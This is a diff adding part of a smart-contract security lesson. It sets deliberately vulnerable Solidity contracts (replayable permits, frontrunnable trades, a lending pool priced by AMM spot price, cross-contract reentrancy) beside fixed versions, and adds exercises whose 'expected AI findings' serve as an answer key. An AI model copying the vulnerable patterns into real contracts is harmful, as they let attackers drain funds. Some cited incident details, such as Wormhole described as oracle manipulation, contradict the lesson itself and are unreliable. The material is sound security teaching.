+// ↑ This will throw error if storage layout conflicts detected
+```
+
+### 5) Signature replay prevention
+
+Signatures must include context to prevent reuse.
+
+#### Vulnerable signature verification
+
+```solidity
+/**
+ * @title VulnerablePermit
+ * @notice Allows gasless approvals via signatures
+ * @dev 🚨 VULNERABILITY: Signature lacks nonce, chainId, expiry
+ */
+contract VulnerablePermit {
+    mapping(address => mapping(address => uint256)) public allowance;
+    
+    /**
+     * @notice Approve via signature
+     * @dev Signature format: sign(keccak256(owner, spender, amount))
+     * @dev 🚨 Can be replayed unlimited times
+     * @dev 🚨 Can be replayed on forks (no chainId)
+     * @dev 🚨 Can be replayed on similar contracts (no contract address)
+     */
+    function permit(
+        address owner,
+        address spender,
+        uint256 amount,
+        bytes calldata signature
+    ) external {
+        // Recover signer from signature
+        bytes32 hash = keccak256(abi.encodePacked(owner, spender, amount));
+        address signer = recoverSigner(hash, signature);
+        
+        require(signer == owner, "Invalid signature");
+        
+        // Approve
+        allowance[owner][spender] = amount;
+    }
+    
+    function recoverSigner(bytes32 hash, bytes memory signature) 
+        internal 
+        pure 
+        returns (address) 
+    {
+        bytes32 r;
+        bytes32 s;
+        uint8 v;
+        
+        assembly {
+            r := mload(add(signature, 32))
+            s := mload(add(signature, 64))
+            v := byte(0, mload(add(signature, 96)))
+        }
+        
+        return ecrecover(hash, v, r, s);
+    }
+}
+```
+
+**Replay attacks:**
+
+1. **Multiple replay**: Attacker intercepts signature, replays it to approve themselves multiple times
+2. **Cross-contract replay**: Uses same signature on PermitV2 contract
+3. **Cross-chain replay**: Replays on Polygon, BSC, etc. (same contract address)
+4. **Time-delayed replay**: Saves signature, replays it years later after user forgets
+
+#### Secure signature with EIP-712
+
+```solidity
+/**
+ * @title SecurePermit
+ * @notice Replay-resistant permit with EIP-712
+ * @dev Includes nonce, deadline, chainId, contract address
+ */
+contract SecurePermit {
+    mapping(address => mapping(address => uint256)) public allowance;
+    mapping(address => uint256) public nonces;  // ✅ Prevents replay
+    
+    bytes32 public constant PERMIT_TYPEHASH = keccak256(
+        "Permit(address owner,address spender,uint256 amount,uint256 nonce,uint256 deadline)"
+    );
+    
+    bytes32 public DOMAIN_SEPARATOR;
+    
+    constructor() {
+        DOMAIN_SEPARATOR = keccak256(
+            abi.encode(
+                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
+                keccak256(bytes("SecurePermit")),
+                keccak256(bytes("1")),
+                block.chainid,  // ✅ Binds to specific chain
+                address(this)   // ✅ Binds to specific contract
+            )
+        );
+    }
+    
+    /**
+     * @notice Approve via EIP-712 signature
+     * @dev ✅ SECURE: Includes nonce (prevents replay), deadline (prevents stale), chainId, contract address
+     */
+    function permit(
+        address owner,
+        address spender,
+        uint256 amount,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external {
+        require(block.timestamp <= deadline, "Permit expired");
+        
+        // Build EIP-712 hash
+        bytes32 structHash = keccak256(
+            abi.encode(
+                PERMIT_TYPEHASH,
+                owner,
+                spender,
+                amount,
+                nonces[owner]++,  // ✅ Increment nonce (prevents replay)
+                deadline
+            )
+        );
+        
+        bytes32 digest = keccak256(
+            abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash)
+        );
+        
+        address signer = ecrecover(digest, v, r, s);
+        require(signer == owner, "Invalid signature");
+        require(signer != address(0), "Invalid signer");
+        
+        allowance[owner][spender] = amount;
+    }
+}
+```
+
+**EIP-712 protection:**
+
+**`nonce`** → Prevents multiple replays of same signature
+- Each signature can only be used once
+
+**`deadline`** → Prevents old signatures being reused years later
+- Signatures expire after specified time
+
+**`chainId`** → Prevents signature replay on forks (Polygon, BSC, etc.)
+- Binds signature to specific blockchain
+
+**`verifyingContract`** → Prevents signature replay on different contracts
+- Binds signature to specific contract address
+
+**`DOMAIN_SEPARATOR`** → Combines all protections into single hash
+- Unifies all the above components for comprehensive protection
+
+### 6) Frontrunning mitigation
+
+MEV bots scan mempool and front-run profitable transactions.
+
+#### Vulnerable to frontrunning
+
+```solidity
+/**
+ * @title VulnerableDEX
+ * @notice DEX vulnerable to frontrunning
+ * @dev Attacker sees your trade, front-runs it, profits from price movement
+ */
+contract VulnerableDEX {
+    uint256 public price = 100;  // Current token price
+    
+    /**
+     * @notice Buy tokens at current price
+     * @dev 🚨 VULNERABILITY: No slippage protection
+     * @dev Attacker frontruns by buying first, price rises, your buy executes at higher price
+     */
+    function buy(uint256 amount) external payable {
+        uint256 cost = amount * price;
+        require(msg.value >= cost, "Insufficient payment");
+        
+        // Price increases with demand
+        price += amount / 100;
+        
+        // Transfer tokens (simplified)
+        // User gets tokens but paid more than expected
+    }
+}
+```
+
+**Frontrunning attack:**
+1. User submits `buy(1000)` at price = 100 (expects to pay 100,000)
+2. Bot sees transaction in mempool
+3. Bot submits `buy(500)` with higher gas price (executes first)
+4. Price rises to 100 + 500/100 = 105
+5. User's transaction executes at new price = 105,000 (paid 5,000 extra)
+6. Bot sells at 105, profits 5,000
+
+#### Commit-reveal pattern
+
+```solidity
+/**
+ * @title CommitRevealDEX
+ * @notice Uses commit-reveal to prevent frontrunning
+ * @dev User commits hash, waits, then reveals actual trade
+ */
+contract CommitRevealDEX {
+    struct Commitment {
+        bytes32 commit;
+        uint256 timestamp;
+    }
+    
+    mapping(address => Commitment) public commitments;
+    
+    // Configuration for different chains
+    uint256 public constant REVEAL_DELAY = 2; // Minimum 2 blocks (adjust per chain)
+    uint256 public constant REVEAL_TIMEOUT = 300; // Maximum 5 minutes
+    
+    /**
+     * @notice Commit to trade (hides details)
+     * @dev Phase 1: User submits hash of (amount, secret)
+     */
+    function commit(bytes32 commitHash) external {
+        commitments[msg.sender] = Commitment(commitHash, block.timestamp);
+    }
+    
+    /**
+     * @notice Reveal trade after delay
+     * @dev Phase 2: User reveals amount and secret after 1 block delay
+     * @dev ✅ Prevents frontrunning because bot doesn't know amount until reveal
+     */
+    function reveal(uint256 amount, bytes32 secret) external payable {
+        Commitment memory commitment = commitments[msg.sender];
+        
+        // Verify commit exists and enough time passed
+        require(commitment.commit != bytes32(0), "No commitment");
+        
+        // Require at least REVEAL_DELAY blocks have passed
+        // Note: On Ethereum mainnet, 1 block ≈ 12 seconds
+        // On Zilliqa 2.0, 1 block ≈ 1-2 seconds (faster finality)
+        // Adjust REVEAL_DELAY based on your target chain's block time
+        require(block.timestamp >= commitment.timestamp + (REVEAL_DELAY * 12), "Too soon");
+        require(block.timestamp < commitment.timestamp + REVEAL_TIMEOUT, "Too late");
+        
+        // Verify reveal matches commit
+        bytes32 computedHash = keccak256(abi.encodePacked(msg.sender, amount, secret));
+        require(computedHash == commitment.commit, "Invalid reveal");
+        
+        // Execute trade (now safe from frontrunning)
+        delete commitments[msg.sender];
+        
+        // Execute trade logic
+        _executeTrade(amount);
+    }
+    
+    function _executeTrade(uint256 amount) internal {
+        // Trade execution
+    }
+}
+```
+
+#### Slippage protection (simpler approach)
+
+```solidity
+/**
+ * @title SlippageProtectedDEX
+ * @notice Users specify max acceptable price
+ */
+contract SlippageProtectedDEX {
+    uint256 public price = 100;
+    
+    /**
+     * @notice Buy with slippage protection
+     * @dev ✅ Reverts if price moves beyond user's tolerance
+     * @param amount Amount to buy
+     * @param maxPrice Maximum acceptable price per token
+     */
+    function buy(uint256 amount, uint256 maxPrice) external payable {
+        // Update price based on demand
+        uint256 newPrice = price + (amount / 100);
+        
+        // ✅ Revert if price moved too much
+        require(newPrice <= maxPrice, "Slippage exceeded");
+        
+        uint256 cost = amount * newPrice;
+        require(msg.value >= cost, "Insufficient payment");
+        
+        price = newPrice;
+        
+        // Execute trade
+    }
+}
+```
+
+## Defense in depth strategy
+
+Layer multiple security controls so single failure doesn't compromise system.
+
+### Multi-layer security architecture
+
+```
+Layer 1: Input Validation
+  - Address format checks (isAddress)
+  - Amount bounds checks (min/max)
+  - Parameter sanitization
+
+Layer 2: Business Logic
+  - Access control (onlyRole modifiers)
+  - State validations (require statements)
+  - Checks-Effects-Interactions pattern
+
+Layer 3: Oracle Security
+  - Chainlink primary oracle
+  - TWAP fallback oracle
+  - Sanity checks (deviation limits)
+  - Circuit breakers (auto-pause on anomaly)
+
+Layer 4: Reentrancy Protection
+  - ReentrancyGuard (single contract)
+  - Cross-contract locks (shared state)
+  - Pull over push pattern
+
+Layer 5: Economic Security
+  - Collateralization ratios (150%+ for lending)
+  - Liquidation mechanisms (incentivize keepers)
+  - Position limits (prevent whale manipulation)
+
+Layer 6: Emergency Controls
+  - Pause mechanism (instant freeze)
+  - Emergency withdrawal (user escape hatch)
+  - Upgrade capability (fix vulnerabilities)
+
+Layer 7: Monitoring & Response
+  - Event logging (all state changes)
+  - Anomaly detection (unusual transactions)
+  - Incident playbooks (pre-planned responses)
+```
+
+### Defense-in-depth visualization
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│  Layer 1: INPUT VALIDATION (First line of defense)         │
+│  - Address checks, amount bounds, parameter sanitization   │
+│  - Fast failure (low gas cost)                             │
+└────────────────┬────────────────────────────────────────────┘
+                 │ Passes
+                 ▼
+┌─────────────────────────────────────────────────────────────┐
+│  Layer 2: BUSINESS LOGIC (Core functionality)               │
+│  - Access control (onlyRole), state validations (require)   │
+│  - Checks-Effects-Interactions pattern                      │
+└────────────────┬────────────────────────────────────────────┘
+                 │ Approved
+                 ▼
+┌─────────────────────────────────────────────────────────────┐
+│  Layer 3: ORACLE SECURITY (Price/data integrity)            │
+│  - Chainlink primary, TWAP backup, sanity checks            │
+│  - Circuit breaker (auto-pause on anomaly)                  │
+└────────────────┬────────────────────────────────────────────┘
+                 │ Price valid
+                 ▼
+┌─────────────────────────────────────────────────────────────┐
+│  Layer 4: REENTRANCY PROTECTION (Execution safety)          │
+│  - ReentrancyGuard (single contract)                        │
+│  - Cross-contract locks (shared state)                      │
+│  - Pull over push pattern                                   │
+└────────────────┬────────────────────────────────────────────┘
+                 │ Safe to execute
+                 ▼
+┌─────────────────────────────────────────────────────────────┐
+│  Layer 5: ECONOMIC SECURITY (Attack profitability)          │
+│  - Collateralization ratios, liquidation mechanisms         │
+│  - Position limits (prevent whale manipulation)             │
+└────────────────┬────────────────────────────────────────────┘
+                 │ Economically sound
+                 ▼
+┌─────────────────────────────────────────────────────────────┐
+│  Layer 6: EMERGENCY CONTROLS (Last resort)                  │
+│  - Pause mechanism, emergency withdrawal                    │
+│  - Upgrade capability (fix vulnerabilities)                 │
+└────────────────┬────────────────────────────────────────────┘
+                 │ If attack detected
+                 ▼
+┌─────────────────────────────────────────────────────────────┐
+│  Layer 7: MONITORING & RESPONSE (Detection/recovery)        │
+│  - Event logging, anomaly detection                         │
+│  - Incident playbooks (pre-planned responses)               │
+└─────────────────────────────────────────────────────────────┘
+
+**Key principle**: Each layer assumes previous layers might fail.
+No single failure point compromises entire system.
+```
+
+## Real-world case studies
+
+### Case study 1: Wormhole bridge ($320M)
+
+**Vulnerability**: Signature verification bypass  
+**Attack**: Attacker forged guardian signature, minted 120K ETH on Ethereum without burning on Solana  
+**Root cause**: Missing verification that signature was from actual guardian set  
+**Reference**: [Wormhole Post-Mortem](https://wormhole.com/wormhole-security-update/) | [Rekt News Analysis](https://rekt.news/wormhole-rekt/)
+
+**Defense in depth failures:**
+- ❌ Single signature verification (no redundancy)
+- ❌ No anomaly detection (120K ETH mint didn't trigger alerts)
+- ❌ No pause mechanism on minting
+- ❌ No mint limit (unlimited minting allowed)
+
+**How defense in depth would have helped:**
+1. ✅ Multi-signature requirement (3-of-5 guardians)
+2. ✅ Mint limits ($10M max per transaction)
+3. ✅ Timelock on large mints (24hr delay for over $1M)
+4. ✅ Anomaly detection (auto-pause on unusual activity)
+5. ✅ Circuit breaker (total mint cap per day)
+
+**Actionable takeaways for your code:**
+- [ ] If you verify signatures, require multiple signers (not just 1)
+- [ ] Add per-transaction limits on all privileged operations (mint, burn, transfer)
+- [ ] Implement anomaly detection: `require(mintAmount <= maxMintPerTx, "Exceeds mint limit");`
+- [ ] Add circuit breaker: `require(totalMintedToday + amount <= dailyMintCap, "Daily cap exceeded");`
+- [ ] Add monitoring: `emit LargeMint(recipient, amount)` when amount exceeds threshold
+- [ ] Add timelock for large operations: `require(block.timestamp >= proposalTime + TIMELOCK_DELAY);`
+
+**Code example for mint limits:**
+
+```solidity
+// Defense-in-depth minting with limits
+uint256 public constant MAX_MINT_PER_TX = 10_000_000e18; // $10M
+uint256 public constant MAX_MINT_PER_DAY = 50_000_000e18; // $50M
+uint256 public totalMintedToday;
+uint256 public lastMintResetTime;
+
+function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {
+    // Reset daily counter if new day
+    if (block.timestamp >= lastMintResetTime + 1 days) {
+        totalMintedToday = 0;
+        lastMintResetTime = block.timestamp;
+    }
+    
+    // Layer 1: Per-transaction limit
+    require(amount <= MAX_MINT_PER_TX, "Exceeds per-tx limit");
+    
+    // Layer 2: Daily limit
+    require(totalMintedToday + amount <= MAX_MINT_PER_DAY, "Exceeds daily limit");
+    
+    // Layer 3: Multi-sig for large amounts
+    if (amount > 1_000_000e18) { // > $1M
+        require(msg.sender == MULTISIG_ADDRESS, "Large mint requires multisig");
+    }
+    
+    totalMintedToday += amount;
+    _mint(to, amount);
+    
+    // Monitoring
+    if (amount > 100_000e18) { // > $100K
+        emit LargeMint(to, amount, block.timestamp);
+    }
+}
+```
+
+### Case study 2: Mango Markets ($110M)
+
+**Vulnerability**: Oracle manipulation via low-liquidity market  
+**Attack**: Attacker used $5M to manipulate MNGO price 1000x on thin orderbook, borrowed $110M against inflated collateral  
+**Reference**: [Mango Markets Incident Analysis](https://docs.mango.markets/) | [Rekt News Report](https://rekt.news/mango-markets-rekt/)
+
+**Defense in depth failures:**
+- ❌ Single oracle source (Pyth with low liquidity)
+- ❌ No sanity checks (allowed 1000x price change)
+- ❌ No circuit breakers (didn't pause on extreme price movement)
+- ❌ No borrow limits (allowed $110M single borrow)
+
+**How defense in depth would have helped:**
+1. ✅ Multiple oracle sources (Chainlink + Pyth + TWAP)
+2. ✅ Price deviation limits (pause if over 50% change per hour)
+3. ✅ Gradual position building (max $1M borrow per block)
+4. ✅ Collateralization ceiling ($10M max borrow per user)
+5. ✅ Time-weighted borrows (can't borrow full amount instantly)
+
+**Actionable takeaways for your code:**
+- [ ] Use multiple oracle sources: `require(abs(chainlinkPrice - twapPrice) < maxDeviation, "Price manipulation detected");`
+- [ ] Add sanity checks: `require(newPrice < oldPrice * 1.5 && newPrice > oldPrice * 0.5, "Price change too large");`
+- [ ] Implement per-user limits: `require(userTotalBorrowed + amount <= MAX_BORROW_PER_USER, "User borrow limit");`
+- [ ] Add per-transaction limits: `require(amount <= MAX_BORROW_PER_TX, "Transaction borrow limit");`
+- [ ] Add time delays: `require(block.timestamp >= lastBorrowTime[user] + borrowCooldown, "Borrow too soon");`
+- [ ] Circuit breaker: `if (priceChange > 50%) { _pause(); emit EmergencyPause("Price manipulation"); }`
+
+**Code example for oracle protection:**
+
+```solidity
+// Defense-in-depth oracle validation
+uint256 public constant MAX_PRICE_DEVIATION = 5; // 5% max deviation
+uint256 public constant MAX_PRICE_CHANGE_PER_HOUR = 50; // 50% max change per hour
+uint256 public lastPrice;
+uint256 public lastPriceUpdateTime;
+
+function getSecurePrice() public view returns (uint256) {
+    // Layer 1: Get Chainlink price
+    (, int256 chainlinkPrice,, uint256 updatedAt,) = chainlinkOracle.latestRoundData();
+    require(chainlinkPrice > 0, "Invalid Chainlink price");
+    require(block.timestamp - updatedAt < 1 hours, "Chainlink stale");
+    
+    // Layer 2: Get TWAP for comparison
+    uint256 twapPrice = getTWAP();
+    
+    // Layer 3: Check deviation between sources
+    uint256 priceUint = uint256(chainlinkPrice);
+    uint256 deviation = priceUint > twapPrice
+        ? ((priceUint - twapPrice) * 100) / twapPrice
+        : ((twapPrice - priceUint) * 100) / priceUint;
+    
+    require(deviation <= MAX_PRICE_DEVIATION, "Oracle price deviation too large");
+    
+    // Layer 4: Check rate of change (prevent rapid manipulation)
+    if (lastPrice > 0) {
+        uint256 timeElapsed = block.timestamp - lastPriceUpdateTime;
+        if (timeElapsed < 1 hours) {
+            uint256 priceChange = priceUint > lastPrice
+                ? ((priceUint - lastPrice) * 100) / lastPrice
+                : ((lastPrice - priceUint) * 100) / priceUint;
+            
+            require(priceChange <= MAX_PRICE_CHANGE_PER_HOUR, "Price changing too fast");
+        }
+    }
+    
+    return priceUint;
+}
+
+// Borrow with position limits
+uint256 public constant MAX_BORROW_PER_USER = 10_000_000e6; // $10M
+uint256 public constant MAX_BORROW_PER_TX = 1_000_000e6; // $1M
+mapping(address => uint256) public userTotalBorrowed;
+mapping(address => uint256) public lastBorrowTime;
+
+function borrow(uint256 amount) external {
+    uint256 price = getSecurePrice(); // Validates oracle health
+    
+    // Layer 1: Per-transaction limit
+    require(amount <= MAX_BORROW_PER_TX, "Exceeds per-tx limit");
+    
+    // Layer 2: Per-user limit
+    require(userTotalBorrowed[msg.sender] + amount <= MAX_BORROW_PER_USER, "Exceeds user limit");
+    
+    // Layer 3: Time delay between borrows (prevent rapid position building)
+    require(block.timestamp >= lastBorrowTime[msg.sender] + 1 minutes, "Borrow cooldown");
+    
+    // Update state
+    userTotalBorrowed[msg.sender] += amount;
+    lastBorrowTime[msg.sender] = block.timestamp;
+    
+    // Execute borrow...
+}
+```
+
+## Production security checklist
+
+**Flash Loan Defenses**
+- [ ] Oracle uses TWAP (not spot price)
+- [ ] Sanity checks on price changes (less than 10% per block)
+- [ ] Position limits prevent whale manipulation
+- [ ] Multi-block actions (can't exploit in single tx)
+
+**Oracle Security**
+- [ ] Primary oracle: Chainlink (manipulation-resistant)
+- [ ] Backup oracle: TWAP from DEX
+- [ ] Freshness checks (less than 1hr staleness)
+- [ ] Deviation checks (Chainlink vs TWAP less than 5%)
+- [ ] Circuit breaker (pause if deviation > 10%)
+
+**Cross-Contract Safety**
+- [ ] Shared reentrancy locks for related contracts
+- [ ] Read-only reentrancy considered
+- [ ] External calls marked and reviewed
+
+**Upgradeability**
+- [ ] Storage gaps in base contracts
+- [ ] OpenZeppelin upgrade plugin used
+- [ ] Storage layout verified before each upgrade
+- [ ] Upgrade tests on forked mainnet
+
+**Signature Security**
+- [ ] EIP-712 used for all signatures
+- [ ] Nonces prevent replay
+- [ ] Deadlines prevent stale signatures
+- [ ] ChainId included in DOMAIN_SEPARATOR
+
+**Frontrunning Protection**
+- [ ] Slippage parameters on all trades
+- [ ] Commit-reveal for sensitive operations
+- [ ] Minimum execution delay where applicable
+
+## Hands-on with AI Reviewer
+
+Submit complex attack scenarios to `/reviewer` and verify it detects sophisticated vulnerabilities.
+
+### Exercise 1: Flash loan vulnerable lending protocol
+
+**Submit this code to `/reviewer`:**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+interface IUniswapV2Pair {
+    function getReserves() external view returns (uint112, uint112, uint32);
+}
+
+contract VulnerableLending {
+    IERC20 public collateralToken;
+    IERC20 public borrowToken;
+    IUniswapV2Pair public priceOracle;
+    
+    mapping(address => uint256) public collateralDeposits;
+    mapping(address => uint256) public borrowed;
+    
+    uint256 public constant COLLATERAL_RATIO = 150;
+    
+    constructor(address _collateral, address _borrow, address _oracle) {
+        collateralToken = IERC20(_collateral);
+        borrowToken = IERC20(_borrow);
+        priceOracle = IUniswapV2Pair(_oracle);
+    }
+    
+    function depositCollateral(uint256 amount) external {
+        collateralToken.transferFrom(msg.sender, address(this), amount);
+        collateralDeposits[msg.sender] += amount;
+    }
+    
+    function borrow(uint256 amount) external {
+        uint256 collateralPrice = getSpotPrice();
+        uint256 collateralValue = collateralDeposits[msg.sender] * collateralPrice;
+        uint256 maxBorrow = (collateralValue * 100) / COLLATERAL_RATIO;
+        
+        require(borrowed[msg.sender] + amount <= maxBorrow, "Under-collateralized");
+        
+        borrowed[msg.sender] += amount;
+        borrowToken.transfer(msg.sender, amount);
+    }
+    
+    function getSpotPrice() public view returns (uint256) {
+        (uint112 reserve0, uint112 reserve1, ) = priceOracle.getReserves();
+        return (uint256(reserve1) * 1e18) / uint256(reserve0);
+    }
+}
+```
+
+**Expected AI findings:**
+
+1. **CRITICAL (10/10)**: Uses spot price from AMM—manipulable via flash loan
+   - **Attack scenario**: "Attacker flash borrows 1M tokens, swaps 900K collateral to borrow tokens in AMM pool (drastically reducing collateral reserves), inflating collateral price 10x. Deposits small collateral, borrows at manipulated price (gets 10x more than should be allowed), swaps back to restore price, repays flash loan. Profit equals over-borrowed amount. Recent example: Wormhole bridge exploited similar oracle manipulation for $320M."
+   - **Recommended fix**: "Replace `getSpotPrice()` with Chainlink oracle for primary price feed. Add TWAP (time-weighted average price) from Uniswap V2/V3 as backup oracle. Implement sanity check: require Chainlink vs TWAP deviation under 10%. Add circuit breaker to pause borrows if deviation exceeds threshold."
+
+2. **HIGH (8/10)**: No reentrancy protection on `borrow()`
+   - **Attack scenario**: "While `borrow()` follows CEI pattern (state update before external call), adding ReentrancyGuard provides defense-in-depth. If future refactoring breaks CEI, guard prevents exploitation."
+   - **Recommended fix**: "Import OpenZeppelin ReentrancyGuard and add `nonReentrant` modifier to `borrow()` function."
+
+3. **MEDIUM (7/10)**: No maximum borrow limit per user or transaction
+   - **Attack scenario**: "Even with oracle protection, attacker could borrow entire pool balance if they have sufficient collateral. No per-user or per-transaction caps enable whale manipulation."
+   - **Recommended fix**: "Add `MAX_BORROW_PER_TX` constant (e.g., $1M). Add `MAX_BORROW_PER_USER` constant (e.g., $10M). Check both in `borrow()` function before allowing borrow."
+
+4. **LOW (5/10)**: Missing events for borrow and collateral deposit actions
+   - **Attack scenario**: "Without events, off-chain monitoring cannot track borrows in real-time. Flash loan attacks might not trigger alerts until funds are already gone."
+   - **Recommended fix**: "Emit `Borrowed(address indexed user, uint256 amount, uint256 collateralPrice)` and `CollateralDeposited(address indexed user, uint256 amount)` events."
+
+**Your task:**
+
+1. Submit the vulnerable contract to `/reviewer`
+2. Compare AI findings to the expected findings above (severity and recommendations should match)
+3. Implement the CRITICAL and HIGH fixes:
+   - Replace spot price with Chainlink + TWAP oracle
+   - Add sanity checks (price deviation under 10%)
+   - Add ReentrancyGuard to `borrow()`
+4. Re-submit fixed version and verify AI clears CRITICAL/HIGH findings
+5. Document any remaining MEDIUM/LOW findings you choose not to fix (with justification)
+
+**Fixed version checklist:**
+- [ ] Added Chainlink oracle as primary price source
+- [ ] Added TWAP from Uniswap as backup oracle
+- [ ] Implemented price deviation sanity check (under 10%)
+- [ ] Added circuit breaker (pause if deviation > threshold)
+- [ ] Added ReentrancyGuard to `borrow()`
+- [ ] Added borrow limits (per-tx and per-user)
+- [ ] Added events for monitoring
+- [ ] Re-ran AI Reviewer and verified all CRITICAL/HIGH cleared
+
+---
+
+### Exercise 2: Cross-contract reentrancy exploitation
+
+**Submit this code to `/reviewer`:**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+contract TokenVault is ReentrancyGuard {
+    mapping(address => uint256) public balances;
+    RewardDistributor public rewardContract;
+    
+    constructor(address _rewardContract) {
+        rewardContract = RewardDistributor(_rewardContract);
+    }
+    
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+    
+    function withdraw(uint256 amount) external nonReentrant {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
+        balances[msg.sender] -= amount;
+        
+        rewardContract.updateRewards(msg.sender);
+        
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Transfer failed");
+    }
+}
+
+contract RewardDistributor is ReentrancyGuard {
+    TokenVault public vault;
+    mapping(address => uint256) public rewards;
+    
+    constructor(address _vault) {
+        vault = TokenVault(_vault);
+    }
+    
+    function updateRewards(address user) external nonReentrant {
+        uint256 userBalance = vault.balances(user);
+        rewards[user] += userBalance / 100;
+    }
+    
+    function claimRewards() external nonReentrant {
+        uint256 reward = rewards[msg.sender];
+        require(reward > 0, "No rewards");
+        rewards[msg.sender] = 0;
+        
+        (bool success, ) = msg.sender.call{value: reward}("");
+        require(success, "Transfer failed");
+    }
+}
+```
+
+**Expected AI findings:**
+
+1. **CRITICAL (9/10)**: Cross-contract reentrancy vulnerability despite individual ReentrancyGuards
+   - **Attack scenario**: "TokenVault and RewardDistributor each have ReentrancyGuard, BUT they don't share state. Attacker contract: (1) Call vault.withdraw(), (2) In receive() callback, call rewards.claimRewards() BEFORE withdraw() completes, (3) rewards.updateRewards() reads vault.balances which is already decreased but transfer hasn't happened, (4) Exploit timing window to claim rewards multiple times. Recent example: Curve Finance lost $62M to cross-contract reentrancy."
+   - **Recommended fix**: "Implement shared reentrancy lock across both contracts. Add `reentrancyLock` state variable to TokenVault (uint256, starts at 1). Add modifier checking this lock to RewardDistributor.updateRewards(). Both contracts check same lock before executing."
+
+2. **HIGH (8/10)**: External call to user address before all state updates complete
+   - **Attack scenario**: "vault.withdraw() makes external call to msg.sender AFTER updating balances but WHILE rewardContract.updateRewards() is executing. This creates a window where state is inconsistent."
+   - **Recommended fix**: "Complete all state updates and cross-contract calls before any external calls to user addresses. Move user transfer to end of function, after all internal contract interactions."
+
+3. **MEDIUM (6/10)**: No validation that reward contract address is legitimate contract
+   - **Attack scenario**: "If rewardContract address is set to attacker's contract during deployment, attacker controls updateRewards() behavior. Could manipulate rewards or create exploit conditions."
+   - **Recommended fix**: "Add validation in constructor: require(_rewardContract.code.length > 0, 'Not a contract'). Better: Use interface type checking or access control to ensure only trusted contracts."
+
+**Your task:**
+
+1. Submit both contracts to `/reviewer` (submit as single file or separately)
+2. Analyze how AI handles cross-contract vulnerabilities
+3. Implement shared reentrancy lock pattern (see lesson lines 679-730)
+4. Re-submit and verify AI recognizes the fix
+5. Write a test that demonstrates the exploit on vulnerable version but fails on fixed version
+
+---
+
+### Exercise 3: EIP-712 signature security
+
+**Submit this code to `/reviewer`:**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract VulnerablePermit {
+    mapping(address => mapping(address => uint256)) public allowance;
+    
+    function permit(
+        address owner,
+        address spender,
+        uint256 amount,
+        bytes calldata signature
+    ) external {
+        bytes32 hash = keccak256(abi.encodePacked(owner, spender, amount));
+        address signer = recoverSigner(hash, signature);
+        
+        require(signer == owner, "Invalid signature");
+        allowance[owner][spender] = amount;
+    }
+    
+    function recoverSigner(bytes32 hash, bytes memory signature) 
+        internal 
+        pure 
+        returns (address) 
+    {
+        bytes32 r;
+        bytes32 s;
+        uint8 v;
+        
+        assembly {
+            r := mload(add(signature, 32))
+            s := mload(add(signature, 64))
+            v := byte(0, mload(add(signature, 96)))
+        }
+        
+        return ecrecover(hash, v, r, s);
+    }
+}
+```
+
+**Expected AI findings:**
+
+1. **CRITICAL (10/10)**: Signature lacks nonce—can be replayed unlimited times
+   - **Attack scenario**: "Attacker intercepts permit signature (e.g., from mempool or phishing). Since signature has no nonce, attacker can call permit() multiple times with same signature. Each call sets allowance, enabling infinite approvals. User signs once, attacker gains unlimited approval forever."
+   - **Recommended fix**: "Add nonces mapping: `mapping(address => uint256) public nonces`. Include nonce in hash: `keccak256(abi.encode(..., nonces[owner]))` and increment it. Increment nonce after successful permit (prevents replay)."
+
+2. **CRITICAL (10/10)**: Signature lacks chainId—can be replayed on forks/L2s
+   - **Attack scenario**: "User signs permit on Ethereum mainnet. Attacker replays SAME signature on Polygon, BSC, Arbitrum, or any other EVM chain where same contract is deployed at same address. Drains user approvals across all chains with single signature."
+   - **Recommended fix**: "Implement EIP-712 DOMAIN_SEPARATOR including block.chainid. This binds signature to specific chain, preventing cross-chain replay."
+
+3. **CRITICAL (10/10)**: Signature lacks deadline—can be replayed years later
+   - **Attack scenario**: "User signs permit in 2024. Attacker saves signature. In 2027, user has forgotten about this signature. Attacker replays it, gains approval, drains tokens. No expiration means infinite validity."
+   - **Recommended fix**: "Add deadline parameter to permit(). Include in signature hash. Check: `require(block.timestamp <= deadline, 'Signature expired')`."
+
+4. **CRITICAL (10/10)**: Signature lacks contract address—can be replayed on similar contracts
+   - **Attack scenario**: "User signs permit for ContractA. Attacker deploys ContractB with same permit() function. Replays signature on ContractB to gain approvals there. No contract address binding means signature works anywhere."
+   - **Recommended fix**: "Include address(this) in EIP-712 DOMAIN_SEPARATOR. This binds signature to specific contract address."
+
+5. **HIGH (8/10)**: Uses non-standard signature scheme (should use EIP-712)
+   - **Attack scenario**: "Custom signature schemes have poor wallet support and are error-prone. Users can't see what they're signing in wallet UI. Increases phishing risk and reduces security."
+   - **Recommended fix**: "Implement full EIP-712 typed structured data hashing. This provides wallet UI visibility and standardized security."
+
+**Your task:**
+
+1. Submit vulnerable code to `/reviewer`
+2. Analyze AI findings for signature vulnerabilities
+3. Implement full EIP-712 pattern with nonce, deadline, chainId, and contract address (see lesson lines 799-864)
+4. Re-submit and verify AI approves the EIP-712 implementation
+5. Compare vulnerable vs secure versions side-by-side
+
+---
+
+### Exercise 4: Comprehensive challenge - Flash-loan-resistant protocol
+
+**Build a production-ready lending protocol with ALL defenses from this lesson:**
+
+**Requirements checklist:**
+- [ ] Uses Chainlink oracle as primary price source
+- [ ] Uses TWAP from Uniswap as backup oracle
+- [ ] Sanity check: Chainlink vs TWAP deviation under 10%
+- [ ] Circuit breaker: Pause borrows if deviation > 10%
+- [ ] ReentrancyGuard on all external calls
+- [ ] Cross-contract reentrancy protection (shared lock if multiple contracts)
+- [ ] EIP-712 signatures for gasless operations (if applicable)
+- [ ] Frontrunning protection: Slippage limits on all trades
+- [ ] Storage gaps for upgradeability (if using proxies)
+- [ ] Per-transaction borrow limits ($1M max)
+- [ ] Per-user borrow limits ($10M max)
